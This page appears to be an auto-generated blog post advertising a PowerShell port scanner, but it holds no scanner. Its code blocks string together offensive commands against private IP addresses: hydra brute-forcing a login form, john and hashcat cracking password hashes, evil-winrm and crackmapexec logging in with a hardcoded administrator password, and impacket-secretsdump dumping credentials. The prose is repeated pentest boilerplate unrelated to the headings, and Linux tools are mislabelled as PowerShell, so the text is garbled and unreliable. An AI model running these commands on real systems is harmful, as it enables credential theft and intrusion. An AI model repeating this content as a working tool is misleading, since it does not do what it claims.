---
TitleSEO: "Automated Port Scanner in PowerShell | ZureFX"
TitlePost: "Automated Port Scanner — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for automated port scanner. Built for security research and automation."
Keywords: "bash, python, c, automation, scanner, go, powershell"
URL: "https://zurefx.github.io/scripting/script-automated-port-scanner-631.html"
URL_IMAGES: ""
Date: "2025-01-17"
Tags: "Bash, Python, C, Automation, Scanner, Go, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-automated-port-scanner-631"
Permalink: "/scripting/script-automated-port-scanner-631.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Initial enumeration revealed several interesting open ports on the target. The service account had excessive permissions assigned in Active Directory. Authentication bypass was achieved through careful manipulation of the login mechanism.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `sharphound`
- `psexec`
- `ffuf`

## Implementation

### Core Logic

The service was running without proper input validation, leading to injection vulnerabilities. The service account had excessive permissions assigned in Active Directory.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.97.12.138 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Weak file permissions allowed modification of critical system files. Group Policy Preferences contained encrypted but recoverable credentials.

### Helper Functions

The application stored sensitive credentials in an unencrypted configuration file. Initial enumeration revealed several interesting open ports on the target.

```powershell
evil-winrm -i 10.23.7.235 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

The target system was identified as running a vulnerable version of the service. The target system was identified as running a vulnerable version of the service.

```bash
crackmapexec smb 10.92.33.115 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.39.1.119 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

The application stored sensitive credentials in an unencrypted configuration file. Network traffic analysis revealed unencrypted communications containing user credentials. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.67.183.39
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.76.173.125/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```

## Output

### Example Output

Network traffic analysis revealed unencrypted communications containing user credentials. Weak file permissions allowed modification of critical system files.

```
[+] Scanning target...
[+] Found 2 results
[+] Done in 23.50s
```
